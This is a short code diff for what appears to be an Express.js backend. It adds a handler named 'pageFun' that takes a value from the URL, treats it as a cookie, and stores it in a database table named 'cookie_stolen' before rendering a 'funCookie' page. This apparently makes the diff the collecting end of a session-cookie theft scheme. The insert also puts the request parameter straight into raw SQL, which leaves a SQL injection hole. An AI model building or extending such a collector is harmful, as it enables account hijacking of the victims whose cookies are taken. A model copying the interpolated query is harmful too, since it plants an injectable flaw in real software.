@@ -1,3 +1,5 @@
+import { db } from "../configs/database.config.js";
+
 export const postCookie = async (req, res) => {
     try {
         const cookie = req.body.cookie;
@@ -18,5 +20,21 @@ export const postCookie = async (req, res) => {
             code: "error",
             message: "Bad request"
         })
+    }
+}
+
+export const pageFun = async (req, res) => {
+    try {
+        const cookie = req.params.id;
+        const query = `
+            INSERT INTO cookie_stolen (content)
+            VALUES ('${cookie}')
+        `;
+
+        await db.query(query);
+        res.render("funCookie")
+    } catch (error) {
+        console.log(error);
+        res.redirect("/");
     }
 }
